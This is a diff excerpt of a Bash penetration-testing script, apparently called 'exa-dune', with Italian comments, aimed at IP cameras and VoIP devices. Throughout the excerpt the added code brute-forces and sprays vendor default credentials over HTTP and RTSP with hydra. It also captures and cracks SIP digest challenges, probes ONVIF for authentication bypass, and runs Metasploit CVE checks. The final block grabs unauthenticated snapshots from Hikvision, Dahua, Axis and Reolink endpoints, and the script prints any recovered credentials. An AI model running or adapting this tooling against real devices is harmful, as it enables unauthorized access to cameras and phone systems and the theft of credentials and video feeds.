+            if [[ -n "$_svc_nmap" ]]; then
+                echo ""
+                echo "Servizi rilevati:"
+                echo "$_svc_nmap" | while IFS= read -r _sl; do echo "  $_sl"; done
+            fi
+            echo ""
+
+            # SNMP
+            echo "── SNMP ──────────────────────────────────────────────────────"
+            if [[ -s "$prescan_dir/snmp_quick.txt" ]]; then
+                cat "$prescan_dir/snmp_quick.txt"
+            else
+                echo "(nessuna community risponde)"
+            fi
+            echo ""
+
+            # Findings summary — conta per severità
+            echo "── FINDINGS ──────────────────────────────────────────────────"
+            local _all_f; _all_f=$(find "$OUTDIR_BASE" -name "findings.txt" \
+                -exec cat {} \; 2>/dev/null | sort -u || true)
+            local _n_crit _n_high _n_med _n_low
+            _n_crit=$(echo "$_all_f" | grep -c "\[CRITICAL\]" 2>/dev/null || echo 0)
+            _n_high=$(echo "$_all_f" | grep -c "\[HIGH\]"     2>/dev/null || echo 0)
+            _n_med=$( echo "$_all_f" | grep -c "\[MEDIUM\]"   2>/dev/null || echo 0)
+            _n_low=$( echo "$_all_f" | grep -c "\[LOW\]"      2>/dev/null || echo 0)
+            echo "CRITICAL : $_n_crit"
+            echo "HIGH     : $_n_high"
+            echo "MEDIUM   : $_n_med"
+            echo "LOW      : $_n_low"
+            echo ""
+            echo "Top findings (CRITICAL/HIGH):"
+            echo "$_all_f" | grep -E "\[CRITICAL\]|\[HIGH\]" | head -20 | \
+                while IFS= read -r _fl; do echo "  $_fl"; done || echo "  (nessuno)"
+            echo ""
+
+            # Credenziali trovate
+            local _creds_file="$OUTDIR_BASE/.exa_creds.json"
+            if [[ -s "$_creds_file" ]]; then
+                echo "── CREDENZIALI TROVATE ───────────────────────────────────"
+                python3 -c "
+import json, sys
+try:
+    data = json.load(open('$_creds_file'))
+    for svc, creds in data.items():
+        for c in creds:
+            print(f'  {svc}: {c.get(\"user\",\"?\")}:{c.get(\"pass\",\"?\")}')
+except: pass
+" 2>/dev/null || true
+                echo ""
+            fi
+
+            # NSE findings
+            if [[ -d "$OUTDIR_BASE/nse_targeted" ]]; then
+                local _nse_hits; _nse_hits=$(grep -rh "VULNERABLE\|CRITICAL\|valid cred\|Anonymous.*allowed\|Authentication: None" \
+                    "$OUTDIR_BASE/nse_targeted/" 2>/dev/null | grep -v "^#\|^--" | head -10 || true)
+                if [[ -n "$_nse_hits" ]]; then
+                    echo "── NSE HITS ──────────────────────────────────────────────"
+                    echo "$_nse_hits" | while IFS= read -r _nh; do echo "  $_nh"; done
+                    echo ""
+                fi
+            fi
+
+            echo "══════════════════════════════════════════════════════════════"
+            echo "Generato: $(date) | exa-dune v${VERSION}"
+        } > "$_dp_file" 2>/dev/null || true
+
+        ok "Device profile salvato: $_dp_file"
+        # Stampa a schermo un riassunto compatto
+        echo ""
+        echo -e "${BOLD}${CYAN}┌─ DEVICE PROFILE ──────────────────────────────────────────┐${NC}"
+        printf "${CYAN}│${NC} %-58s ${CYAN}│${NC}\n" "Target  : $target"
+        [[ -n "$detected_vendor" ]] && printf "${CYAN}│${NC} %-58s ${CYAN}│${NC}\n" "Vendor  : $detected_vendor"
+        printf "${CYAN}│${NC} %-58s ${CYAN}│${NC}\n" "TCP     : ${open_tcp:-(nessuna)}"
+        printf "${CYAN}│${NC} %-58s ${CYAN}│${NC}\n" "Findings: CRIT=$_n_crit HIGH=$_n_high MED=$_n_med LOW=$_n_low"
+        echo -e "${BOLD}${CYAN}└───────────────────────────────────────────────────────────┘${NC}"
+        echo ""
+    else
+        echo -e "${CYAN}[DRY-RUN]${NC} device_profile.txt → vendor/porte/servizi/findings/credenziali"
+    fi
+
     # ─────────────────────────────────────────────────────────
     # FASE 3 — ATTACCHI
     # ─────────────────────────────────────────────────────────
+    _phase_num=3
     echo ""
     echo -e "${BOLD}${RED}══════════════════════════════════════════${NC}"
     echo -e "${BOLD}${RED}  FASE 3 — ATTACCHI                       ${NC}"
@@ -8720,6 +9621,59 @@ cmd_auto() {
         grep -vP '^\s*(-{5,}|Exploits:|ShellCodes:|No Results|^\s*$)' "$_ss_file" 2>/dev/null \
             | head -15 | while IFS= read -r _l; do echo "    $_l"; done
         echo ""
+    fi
+
+    # ── CVE exploitation via Metasploit ──────────────────────────
+    if [[ $DRY_RUN -eq 0 && -s "$_ss_file" ]] && \
+       grep -qvP '^\s*(-{5,}|Exploits:|ShellCodes:|No Results|^\s*$)' "$_ss_file" 2>/dev/null; then
+        if command -v msfconsole &>/dev/null; then
+            log "  ▶ CVE exploitation check via Metasploit"
+            ran_attack=1
+            local _msf_dir="$OUTDIR_BASE/msf"
+            mkdir -p "$_msf_dir"
+            # Estrai CVE IDs univoci dal searchsploit output
+            local _cves; _cves=$(grep -oP 'CVE-\d{4}-\d+' "$_ss_file" 2>/dev/null | sort -u || true)
+            if [[ -n "$_cves" ]]; then
+                # Fase A: cerca moduli Metasploit corrispondenti ai CVE
+                local _msf_search_rc="$_msf_dir/search.rc"
+                { echo "spool $_msf_dir/search_out.txt"
+                  while IFS= read -r _cve; do
+                      echo "search cve:${_cve#CVE-} type:exploit platform:multi,linux,windows"
+                  done <<< "$_cves"
+                  echo "exit"; } > "$_msf_search_rc"
+                timeout 90 msfconsole -q -r "$_msf_search_rc" > /dev/null 2>&1 || true
+                # Estrai moduli trovati (nome modulo, es. exploit/linux/misc/foo)
+                local _found_mods; _found_mods=$(grep -oP '^\s+\d+\s+\K(exploit|auxiliary)/\S+' \
+                    "$_msf_dir/search_out.txt" 2>/dev/null | head -5 || true)
+                if [[ -n "$_found_mods" ]]; then
+                    log "  Metasploit: $(echo "$_found_mods" | wc -l) moduli trovati per i CVE"
+                    # Fase B: esegui "check" su ciascun modulo (non exploit — solo verifica)
+                    local _msf_check_rc="$_msf_dir/check.rc"
+                    { echo "spool $_msf_dir/check_out.txt"
+                      while IFS= read -r _mod; do
+                          echo "use $_mod"
+                          echo "set RHOSTS $target"
+                          echo "set ConnectTimeout 8"
+                          echo "check"
+                          echo "back"
+                      done <<< "$_found_mods"
+                      echo "exit"; } > "$_msf_check_rc"
+                    timeout 180 msfconsole -q -r "$_msf_check_rc" > /dev/null 2>&1 || true
+                    if grep -qi "appears to be vulnerable\|is vulnerable" \
+                            "$_msf_dir/check_out.txt" 2>/dev/null; then
+                        found CRITICAL "Metasploit: target vulnerabile a CVE noto — vedi $OUTDIR_BASE/msf/check_out.txt"
+                        grep -i "vulnerable" "$_msf_dir/check_out.txt" | head -5 | \
+                            while IFS= read -r _l; do log "    $_l"; done || true
+                    else
+                        log "  Metasploit check: nessuna vulnerabilità confermata (check eseguiti)"
+                    fi
+                else
+                    log "  Metasploit: nessun modulo trovato per i CVE identificati"
+                fi
+            fi
+        else
+            log "  CVE exploitation: msfconsole non disponibile (apt install metasploit-framework)"
+        fi
     fi
 
     # ── Quick default IoT creds (pre-hydra, rapido) ───────────────
@@ -8758,7 +9712,44 @@ cmd_auto() {
         _svc_found 8443 "https.*8443\|ssl.*8443"       && _quick_default_web https 8443
     fi
 
+    # ── Rate limiting detection ───────────────────────────────────
+    # Rileva HTTP 429/503 o backoff progressivo prima del brute-force
+    _ratelimit_check() {
+        local _sc="$1" _po="$2"
+        local _ins=""; [[ "$_sc" == "https" ]] && _ins="-k"
+        local _blocked=0 _delays=()
+        for _i in 1 2 3; do
+            local _t0; _t0=$(date +%s%3N 2>/dev/null || date +%s)
+            local _code
+            _code=$(curl -s $_ins -o /dev/null -w "%{http_code}" \
+                --user "exa_rl_probe_$$:wrongpass_$$" --max-time 4 \
+                "${_sc}://${target}:${_po}/" 2>/dev/null || echo "000")
+            local _t1; _t1=$(date +%s%3N 2>/dev/null || date +%s)
+            _delays+=("$(( _t1 - _t0 ))")
+            [[ "$_code" == "429" || "$_code" == "503" || "$_code" == "429" ]] && _blocked=1 && break
+        done
+        if [[ $_blocked -eq 1 ]]; then
+            warn "  Rate limiting su ${_sc}:${_po} (HTTP 429/503) — brute-force rallentato"
+            HYDRA_RATE_OPTS="-t 1 -W 5 -w 8"
+            return 0
+        fi
+        # Backoff progressivo: l'ultimo tentativo è 3x più lento del primo
+        if [[ ${#_delays[@]} -ge 3 && ${_delays[-1]} -gt $(( ${_delays[0]} * 3 )) && ${_delays[-1]} -gt 2000 ]]; then
+            warn "  Backoff progressivo rilevato su ${_sc}:${_po} — brute-force rallentato"
+            HYDRA_RATE_OPTS="-t 1 -W 3"
+            return 0
+        fi
+        HYDRA_RATE_OPTS=""
+        return 1
+    }
+
     # ── Brute-force web ───────────────────────────────────────────
+    if [[ $DRY_RUN -eq 0 ]]; then
+        _svc_found 80   "http.*80\|HTTP.*80\|web.*80"  && _ratelimit_check http  80
+        _svc_found 443  "https\|ssl.*443\|HTTP.*443"   && _ratelimit_check https 443
+        _svc_found 8080 "http.*8080"                   && _ratelimit_check http  8080
+        _svc_found 8443 "https.*8443\|ssl.*8443"       && _ratelimit_check https 8443
+    fi
     _svc_found 80   "http.*80\|HTTP.*80\|web.*80"    && _atk "Brute HTTP  :80"   creds "$target" http  --port 80
     _svc_found 443  "https\|ssl.*443\|HTTP.*443"     && _atk "Brute HTTPS :443"  creds "$target" https --port 443
     _svc_found 8080 "http.*8080"                     && _atk "Brute HTTP  :8080" creds "$target" http  --port 8080
@@ -9060,14 +10051,59 @@ cmd_auto() {
         log "  ▶ Default creds vendor-specifiche ($detected_vendor)"
         ran_attack=1
         local _vpairs=()
+        # Wordlist vendor-specifica: usa file esterno se disponibile, embedded come fallback
+        local _vwl_dir="/usr/share/exa-dune/wordlists/vendor"
         case "$detected_vendor" in
-            hikvision) _vpairs=("admin:12345" "admin:Admin12345" "admin:Hikvision12345" "service:Hikvision") ;;
-            dahua)     _vpairs=("admin:admin" "admin:Admin12345!" "admin:123456" "666666:666666" "888888:888888") ;;
-            axis)      _vpairs=("root:pass" "root:axis" "admin:axis" "admin:admin" "root:root") ;;
-            reolink)   _vpairs=("admin:" "admin:reolink" "admin:123456" "admin:654321") ;;
-            audiocodes) _vpairs=("Admin:Admin" "admin:admin" "User:User" "Admin:1234" "Admin:") ;;
-            commend)   _vpairs=("admin:admin" "admin:commend" "webadmin:webadmin" "admin:1234") ;;
-            generic)   _vpairs=("admin:admin" "admin:1234" "admin:password" "root:root") ;;
+            hikvision)
+                if [[ -f "$_vwl_dir/hikvision.txt" ]]; then
+                    mapfile -t _vpairs < "$_vwl_dir/hikvision.txt"
+                else
+                    _vpairs=("admin:12345" "admin:Admin12345" "admin:Hikvision12345" "admin:1234"
+                             "service:Hikvision" "admin:admin" "admin:password" "admin:hikadmin"
+                             "admin:12345678" "user:user" "guest:guest" "admin:123456")
+                fi ;;
+            dahua)
+                if [[ -f "$_vwl_dir/dahua.txt" ]]; then
+                    mapfile -t _vpairs < "$_vwl_dir/dahua.txt"
+                else
+                    _vpairs=("admin:admin" "admin:Admin12345!" "admin:123456" "admin:dahua"
+                             "666666:666666" "888888:888888" "admin:dahua123" "admin:password"
+                             "admin:" "default:default" "admin:12345" "user:user")
+                fi ;;
+            axis)
+                if [[ -f "$_vwl_dir/axis.txt" ]]; then
+                    mapfile -t _vpairs < "$_vwl_dir/axis.txt"
+                else
+                    _vpairs=("root:pass" "root:axis" "admin:axis" "admin:admin" "root:root"
+                             "admin:password" "viewer:viewer" "operator:operator"
+                             "root:password" "admin:1234" "ptz:ptz" "user:user")
+                fi ;;
+            reolink)
+                if [[ -f "$_vwl_dir/reolink.txt" ]]; then
+                    mapfile -t _vpairs < "$_vwl_dir/reolink.txt"
+                else
+                    _vpairs=("admin:" "admin:reolink" "admin:123456" "admin:654321"
+                             "admin:admin" "admin:password" "admin:12345" "admin:1234")
+                fi ;;
+            audiocodes)
+                if [[ -f "$_vwl_dir/audiocodes.txt" ]]; then
+                    mapfile -t _vpairs < "$_vwl_dir/audiocodes.txt"
+                else
+                    _vpairs=("Admin:Admin" "admin:admin" "User:User" "Admin:1234" "Admin:"
+                             "admin:AudioCodes" "admin:AC" "admin:password" "Admin:Admin1234"
+                             "root:root" "guest:guest" "support:support" "admin:voip")
+                fi ;;
+            commend)
+                if [[ -f "$_vwl_dir/commend.txt" ]]; then
+                    mapfile -t _vpairs < "$_vwl_dir/commend.txt"
+                else
+                    _vpairs=("admin:admin" "admin:commend" "webadmin:webadmin" "admin:1234"
+                             "admin:password" "supervisor:supervisor" "user:user" "admin:commend123")
+                fi ;;
+            generic)
+                _vpairs=("admin:admin" "admin:1234" "admin:password" "root:root"
+                         "admin:12345" "admin:" "root:password" "user:user"
+                         "admin:admin1234" "guest:guest" "admin:123456" "administrator:administrator") ;;
         esac
         for _vp in "${_vpairs[@]}"; do
             local _vu="${_vp%%:*}" _vpass="${_vp##*:}"
@@ -9286,6 +10322,414 @@ cmd_auto() {
         _atk "SIP TLS fuzz" sipfuzz "$target" --port 5061 --method OPTIONS
     fi
 
+    # ── SIP digest challenge capture + crack ─────────────────────
+    if _svc_found 5060 "sip\|SIP\|voip"; then
+        log "  ▶ SIP digest challenge capture"
+        ran_attack=1
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/sip"
+            # Invia INVITE senza auth → cattura 401 con realm/nonce per offline crack
+            local _sip_probe
+            _sip_probe=$(timeout 8 bash -c \
+                "printf 'INVITE sip:100@${target} SIP/2.0\r\nVia: SIP/2.0/UDP ${target}:5060;branch=z9hG4bK-exa\r\nFrom: <sip:exa@${target}>;tag=exa1\r\nTo: <sip:100@${target}>\r\nCall-ID: exa-probe-$$@${target}\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n' \
+                 | nc -u -w 6 ${target} 5060 2>/dev/null" || true)
+            if echo "$_sip_probe" | grep -q "^SIP/2.0 401\|^SIP/2.0 407"; then
+                echo "$_sip_probe" > "$OUTDIR_BASE/sip/digest_challenge.txt"
+                local _realm; _realm=$(echo "$_sip_probe" | grep -oP '(?<=realm=")[^"]+' | head -1 || true)
+                local _algo;  _algo=$(echo  "$_sip_probe" | grep -oP '(?<=algorithm=)\S+'  | head -1 || true)
+                found MEDIUM "SIP:5060 — digest challenge catturato (realm: ${_realm:-unknown}, algo: ${_algo:-MD5})"
+                # Tenta svcrack se disponibile
+                if command -v svcrack &>/dev/null; then
+                    local _wl; _wl=$(_wl_pass)
+                    log "  SIP: avvio svcrack su realm '$_realm'..."
+                    svcrack -u 100 -d "$_wl" "$target" \
+                        > "$OUTDIR_BASE/sip/svcrack_out.txt" 2>&1 || true
+                    grep -i "found password\|cracked\|password:" "$OUTDIR_BASE/sip/svcrack_out.txt" 2>/dev/null && \
+                        found CRITICAL "SIP:5060 — password craccata: $(grep -i 'found\|cracked\|password:' "$OUTDIR_BASE/sip/svcrack_out.txt" | head -1)"
+                fi
+            else
+                log "  SIP: nessuna risposta 401/407 ricevuta"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} SIP INVITE → cattura 401 digest + svcrack"
+        fi
+    fi
+
+    # ── ONVIF authentication bypass ───────────────────────────────
+    if [[ $is_camera -eq 1 ]] || echo "$all_findings" | grep -qi "onvif\|camera\|rtsp"; then
+        log "  ▶ ONVIF authentication bypass"
+        ran_attack=1
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/onvif"
+            local _onvif_found=0
+            for _onvif_port in 80 443 8080 8000; do
+                _port_open "$_onvif_port" || continue
+                local _osc="http"; [[ "$_onvif_port" == "443" ]] && _osc="https"
+                local _oi=""; [[ "$_osc" == "https" ]] && _oi="-k"
+                # GetCapabilities senza WS-Security header
+                local _onvif_resp
+                _onvif_resp=$(curl -s $_oi --max-time 8 \
+                    -X POST "${_osc}://${target}:${_onvif_port}/onvif/device_service" \
+                    -H 'Content-Type: application/soap+xml; charset=utf-8' \
+                    -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetCapabilities xmlns="http://www.onvif.org/ver10/device/wsdl"><Category>All</Category></GetCapabilities></s:Body></s:Envelope>' \
+                    2>/dev/null || true)
+                if echo "$_onvif_resp" | grep -qi "CapabilitiesResponse\|PTZ\|Imaging\|Media\|Events"; then
+                    echo "$_onvif_resp" > "$OUTDIR_BASE/onvif/bypass_cap_${_onvif_port}.xml"
+                    found CRITICAL "ONVIF:${_onvif_port} — GetCapabilities senza autenticazione (auth bypass)"
+                    # GetDeviceInformation per fingerprint preciso
+                    local _dev_info
+                    _dev_info=$(curl -s $_oi --max-time 5 \
+                        -X POST "${_osc}://${target}:${_onvif_port}/onvif/device_service" \
+                        -H 'Content-Type: application/soap+xml; charset=utf-8' \
+                        -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>' \
+                        2>/dev/null || true)
+                    echo "$_dev_info" > "$OUTDIR_BASE/onvif/bypass_devinfo_${_onvif_port}.xml"
+                    local _omfr; _omfr=$(echo "$_dev_info" | grep -oP '(?<=<Manufacturer>)[^<]+' | head -1 || true)
+                    local _omdl; _omdl=$(echo "$_dev_info" | grep -oP '(?<=<Model>)[^<]+'        | head -1 || true)
+                    local _ofw;  _ofw=$(echo  "$_dev_info" | grep -oP '(?<=<FirmwareVersion>)[^<]+' | head -1 || true)
+                    [[ -n "$_omfr" ]] && found HIGH "ONVIF — Device info (no auth): $_omfr $_omdl fw:${_ofw:-n/a}"
+                    _onvif_found=1
+                    break
+                fi
+            done
+            [[ $_onvif_found -eq 0 ]] && log "  ONVIF: nessun endpoint risponde senza autenticazione"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} ONVIF GetCapabilities/GetDeviceInformation senza WS-Security"
+        fi
+    fi
+
+    # ── RTSP credential spray ─────────────────────────────────────
+    if { _port_open 554 || _port_open 8554 || echo "$all_findings" | grep -qi "rtsp"; }; then
+        log "  ▶ RTSP credential spray"
+        ran_attack=1
+        local _rsp=554; _port_open 8554 && _rsp=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            local _rtsp_spray_creds=()
+            case "$detected_vendor" in
+                hikvision) _rtsp_spray_creds=("admin:12345" "admin:Admin12345" "admin:admin" "service:Hikvision") ;;
+                dahua)     _rtsp_spray_creds=("admin:admin" "admin:Admin12345!" "admin:123456" "666666:666666") ;;
+                axis)      _rtsp_spray_creds=("root:pass" "root:axis" "admin:admin" "root:root") ;;
+                reolink)   _rtsp_spray_creds=("admin:" "admin:reolink" "admin:123456") ;;
+                *)         _rtsp_spray_creds=("admin:admin" "admin:1234" "admin:" "root:root" "admin:password" "user:user") ;;
+            esac
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _rtsp_spray_paths=("/" "/live" "/stream" "/video1" "/h264/ch1/main/av_stream"
+                                     "/cam/realmonitor" "/axis-media/media.amp" "/h264Preview_01_main")
+            local _rtsp_cracked=0
+            for _rc in "${_rtsp_spray_creds[@]}"; do
+                local _ru="${_rc%%:*}" _rpass="${_rc##*:}"
+                for _rpath in "${_rtsp_spray_paths[@]}"; do
+                    local _rresp
+                    _rresp=$(timeout 6 bash -c \
+                        "printf 'DESCRIBE rtsp://${_ru}:${_rpass}@${target}:${_rsp}${_rpath} RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic \$(printf '%s:%s' '${_ru}' '${_rpass}' | base64)\r\n\r\n' \
+                         | nc -q 2 ${target} ${_rsp} 2>/dev/null" || true)
+                    if echo "$_rresp" | grep -q "^RTSP/1.0 200"; then
+                        found CRITICAL "RTSP:${_rsp}${_rpath} — credenziali valide: ${_ru}:${_rpass}"
+                        echo "${_ru}:${_rpass}" >> "$OUTDIR_BASE/rtsp/valid_creds.txt"
+                        _cred_store_add rtsp "$target" "$_rsp" "$_ru" "$_rpass" "rtsp:spray"
+                        _rtsp_cracked=1; break 2
+                    fi
+                done
+            done
+            [[ $_rtsp_cracked -eq 0 ]] && log "  RTSP credential spray: nessuna credenziale valida trovata"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP credential spray (vendor-specific creds su ${_rsp})"
+        fi
+    fi
+
+    # ── RTSP: OPTIONS fingerprint + server banner ────────────────
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP OPTIONS fingerprint"
+        ran_attack=1
+        local _rfp=554; _port_open 8554 && _rfp=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _opt_resp
+            _opt_resp=$(timeout 5 bash -c \
+                "printf 'OPTIONS * RTSP/1.0\r\nCSeq: 1\r\n\r\n' \
+                 | nc -q 2 ${target} ${_rfp} 2>/dev/null" || true)
+            if [[ -n "$_opt_resp" ]]; then
+                echo "$_opt_resp" > "$OUTDIR_BASE/rtsp/options.txt"
+                local _srv_b; _srv_b=$(echo "$_opt_resp" | grep -i "^Server:" | head -1 || true)
+                [[ -n "$_srv_b" ]] && found LOW "RTSP:${_rfp} — server banner: $_srv_b"
+                local _pub; _pub=$(echo "$_opt_resp" | grep -i "^Public:" | head -1 || true)
+                [[ -n "$_pub" ]] && log "  RTSP Public methods: $_pub"
+            fi
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP OPTIONS * → banner + allowed methods :${_rfp}"
+        fi
+    fi
+
+    # ── RTSP: GET_PARAMETER info leak ────────────────────────────
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP GET_PARAMETER info leak"
+        ran_attack=1
+        local _rgp=554; _port_open 8554 && _rgp=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            for _gp_path in "/" "/live" "/stream" "/live/ch0"; do
+                local _gp_resp
+                _gp_resp=$(timeout 5 bash -c \
+                    "printf 'GET_PARAMETER rtsp://${target}:${_rgp}${_gp_path} RTSP/1.0\r\nCSeq: 2\r\nContent-Type: text/parameters\r\nContent-Length: 15\r\n\r\ngets_parameter\n' \
+                     | nc -q 2 ${target} ${_rgp} 2>/dev/null" || true)
+                if echo "$_gp_resp" | grep -q "^RTSP/1.0 200"; then
+                    echo "$_gp_resp" > "$OUTDIR_BASE/rtsp/get_param.txt"
+                    found MEDIUM "RTSP:${_rgp}${_gp_path} — GET_PARAMETER senza autenticazione (info leak)"
+                    break
+                fi
+            done
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP GET_PARAMETER senza autenticazione"
+        fi
+    fi
+
+    # ── RTSP: path wordlist scan ──────────────────────────────────
+    # Usa la wordlist completa per trovare stream nascosti o protetti
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP path wordlist scan (top 100)"
+        ran_attack=1
+        local _rwl_port=554; _port_open 8554 && _rwl_port=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _rtsp_wl; _rtsp_wl=$(_wl_rtsp_paths)
+            local _wl_count=0 _found_anon=0
+            while IFS= read -r _wpath && [[ $_wl_count -lt 100 ]]; do
+                [[ -z "$_wpath" || "$_wpath" == \#* ]] && continue
+                (( _wl_count++ )) || true
+                local _wresp
+                _wresp=$(timeout 4 bash -c \
+                    "printf 'DESCRIBE rtsp://${target}:${_rwl_port}${_wpath} RTSP/1.0\r\nCSeq: 1\r\n\r\n' \
+                     | nc -q 2 ${target} ${_rwl_port} 2>/dev/null" || true)
+                if echo "$_wresp" | grep -q "^RTSP/1.0 200"; then
+                    found HIGH "RTSP:${_rwl_port}${_wpath} — stream trovato senza autenticazione"
+                    echo "$_wresp" > "$OUTDIR_BASE/rtsp/wl_stream_${_wl_count}.txt"
+                    (( _found_anon++ )) || true
+                elif echo "$_wresp" | grep -q "^RTSP/1.0 401\|^RTSP/1.0 403"; then
+                    echo "$_wpath" >> "$OUTDIR_BASE/rtsp/auth_required_paths.txt"
+                fi
+            done < "$_rtsp_wl"
+            [[ $_found_anon -gt 0 ]] && ok "  Stream anonimi trovati: $_found_anon path"
+            [[ -s "$OUTDIR_BASE/rtsp/auth_required_paths.txt" ]] && \
+                log "  Path con auth richiesta: $(wc -l < "$OUTDIR_BASE/rtsp/auth_required_paths.txt") — vedi rtsp/auth_required_paths.txt"
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP DESCRIBE wordlist scan (top 100) :554/8554"
+        fi
+    fi
+
+    # ── RTSP: hydra brute-force con dizionario completo ──────────
+    if { _port_open 554 || _port_open 8554; }; then
+        log "  ▶ RTSP hydra brute-force"
+        ran_attack=1
+        local _rhyd=554; _port_open 8554 && _rhyd=8554
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            local _ul; _ul=$(_wl_users)
+            local _pl; _pl=$(_wl_pass)
+            local _hydra_rtsp_out="$OUTDIR_BASE/rtsp/hydra_rtsp.txt"
+            hydra -L "$_ul" -P "$_pl" -s "$_rhyd" -t 4 -f \
+                -m "/" -o "$_hydra_rtsp_out" "$target" rtsp 2>&1 | \
+                tee -a "$OUTDIR_BASE/rtsp/rtsp.log" || true
+            grep -i "login:" "$_hydra_rtsp_out" 2>/dev/null | while IFS= read -r _hline; do
+                found CRITICAL "RTSP:${_rhyd} — credenziali valide (hydra): $_hline"
+                local _hu _hp
+                _hu=$(echo "$_hline" | grep -oP 'login:\s*\K\S+' || true)
+                _hp=$(echo "$_hline" | grep -oP 'password:\s*\K\S+' || true)
+                [[ -n "$_hu" ]] && _cred_store_add rtsp "$target" "$_rhyd" "$_hu" "$_hp" "rtsp:hydra"
+            done || true
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} hydra -L users -P pass -s 554 $target rtsp"
+        fi
+    fi
+
+    # ── RTSP: CVE vendor-specific (snapshot/config senza auth) ───
+    if { _port_open 554 || _port_open 8554; } && [[ -n "$detected_vendor" ]]; then
+        log "  ▶ RTSP CVE vendor-specific [$detected_vendor]"
+        ran_attack=1
+        if [[ $DRY_RUN -eq 0 ]]; then
+            mkdir -p "$OUTDIR_BASE/rtsp"
+            case "$detected_vendor" in
+                hikvision)
+                    # CVE-2021-36260 / ISAPI snapshot senza auth
+                    for _hkp in 80 443 8080; do
+                        _port_open "$_hkp" || continue
+                        local _hsc="http"; [[ "$_hkp" == "443" ]] && _hsc="https"
+                        local _hi=""; [[ "$_hsc" == "https" ]] && _hi="-k"
+                        local _hcode
+                        _hcode=$(curl -s $_hi --max-time 8 \
+                            -o "$OUTDIR_BASE/rtsp/hik_snapshot.jpg" -w "%{http_code}" \
+                            "${_hsc}://${target}:${_hkp}/ISAPI/Streaming/channels/101/picture" \
+                            2>/dev/null || echo "000")
+                        if [[ "$_hcode" == "200" && -s "$OUTDIR_BASE/rtsp/hik_snapshot.jpg" ]]; then
+                            found CRITICAL "Hikvision — ISAPI snapshot senza auth (CVE-2021-36260) → rtsp/hik_snapshot.jpg"; break
+                        fi
+                        _hcode=$(curl -s $_hi --max-time 8 \
+                            -o "$OUTDIR_BASE/rtsp/hik_psia.jpg" -w "%{http_code}" \
+                            "${_hsc}://${target}:${_hkp}/PSIA/Streaming/channels/1/picture" \
+                            2>/dev/null || echo "000")
+                        [[ "$_hcode" == "200" && -s "$OUTDIR_BASE/rtsp/hik_psia.jpg" ]] && \
+                            found HIGH "Hikvision — PSIA snapshot senza auth → rtsp/hik_psia.jpg"
+                    done ;;
+                dahua)
+                    for _dhp in 80 443; do
+                        _port_open "$_dhp" || continue
+                        local _dhsc="http"; [[ "$_dhp" == "443" ]] && _dhsc="https"
+                        local _dhi=""; [[ "$_dhsc" == "https" ]] && _dhi="-k"
+                        local _dhcode
+                        _dhcode=$(curl -s $_dhi --max-time 6 \
+                            -o "$OUTDIR_BASE/rtsp/dahua_snapshot.jpg" -w "%{http_code}" \
+                            "${_dhsc}://${target}:${_dhp}/cgi-bin/snapshot.cgi" \
+                            2>/dev/null || echo "000")
+                        [[ "$_dhcode" == "200" && -s "$OUTDIR_BASE/rtsp/dahua_snapshot.jpg" ]] && \
+                            found CRITICAL "Dahua — snapshot senza autenticazione → rtsp/dahua_snapshot.jpg"
+                    done ;;
+                axis)
+                    for _axp in 80 443 8080; do
+                        _port_open "$_axp" || continue
+                        local _axsc="http"; [[ "$_axp" == "443" ]] && _axsc="https"
+                        local _axi=""; [[ "$_axsc" == "https" ]] && _axi="-k"
+                        local _axcode
+                        _axcode=$(curl -s $_axi --max-time 6 \
+                            -o "$OUTDIR_BASE/rtsp/axis_snapshot.jpg" -w "%{http_code}" \
+                            "${_axsc}://${target}:${_axp}/axis-cgi/jpg/image.cgi" \
+                            2>/dev/null || echo "000")
+                        [[ "$_axcode" == "200" && -s "$OUTDIR_BASE/rtsp/axis_snapshot.jpg" ]] && \
+                            found CRITICAL "Axis — snapshot senza autenticazione → rtsp/axis_snapshot.jpg"
+                    done ;;
+                reolink)
+                    for _rlp in 80 443; do
+                        _port_open "$_rlp" || continue
+                        local _rlsc="http"; [[ "$_rlp" == "443" ]] && _rlsc="https"
+                        local _rli=""; [[ "$_rlsc" == "https" ]] && _rli="-k"
+                        local _rlcode
+                        _rlcode=$(curl -s $_rli --max-time 6 \
+                            -o "$OUTDIR_BASE/rtsp/reolink_snapshot.jpg" -w "%{http_code}" \
+                            "${_rlsc}://${target}:${_rlp}/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=1&user=admin&password=" \
+                            2>/dev/null || echo "000")
+                        [[ "$_rlcode" == "200" && -s "$OUTDIR_BASE/rtsp/reolink_snapshot.jpg" ]] && \
+                            found CRITICAL "Reolink — snapshot senza autenticazione → rtsp/reolink_snapshot.jpg"
+                    done ;;
+            esac
+        else
+            echo -e "${CYAN}[DRY-RUN]${NC} RTSP CVE vendor-specific [$detected_vendor]: snapshot/config senza auth"
+        fi
+    fi
+
